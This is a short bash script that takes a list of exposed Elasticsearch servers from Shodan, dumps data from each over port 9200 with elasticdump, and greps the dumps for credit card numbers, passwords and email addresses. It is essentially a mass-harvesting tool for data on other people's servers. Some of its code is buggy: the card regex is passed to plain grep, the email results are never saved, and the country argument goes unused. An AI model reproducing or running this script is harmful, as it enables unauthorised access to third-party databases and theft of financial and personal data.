#!/bin/bash

# Do a shodan search for elastic open port 9200
# Pass country code as ARGV[1]

echo "Downloading list of open elastic search servers..."
shodan download elasticsearcher elastic --limit=1000
# number=$(shodan count 9200,elastic)
# echo "Number of servers found: "$number

echo "Converting list to csv..."
# Convert json to csv and save to ipToTest
shodan parse --fields ip_str --separator , elasticsearcher.json.gz > ipToTest
uniq ipToTest > ipNew
cp ipNew ipToTest
rm ipNew

# Loop through ipToTest File
echo "Trying each site..."
while read p; do

	echo "$p"
	# Use elasticdump to connect to each site, dump section of database for 10 seconds
	timeout 10 elasticdump --input=http://"$p":9200 --output="$p" --type=data > /dev/null

	# If dump exists
	if [ -s "$p" ]
	then

		# Check for Credit Cards
		cat $p | grep "^(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13})$" > cc
		if [ -s cc ]
		then
			echo "Potential Credit Cards Found"
			cat cc
			rm cc
		fi

		# Check for Passwords
		cat $p | grep "password" > pass
		if [ -s pass ]
		then
			echo "Potential Passwords Found"
			cat pass
			rm pass
		fi
	
		# Check for email addresses
		grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" $p
		if [ -s emails ]
		then
			echo "Potential Emails Found"
			cat emails
			rm emails
		fi
	rm "$p"
	fi

done <ipToTest



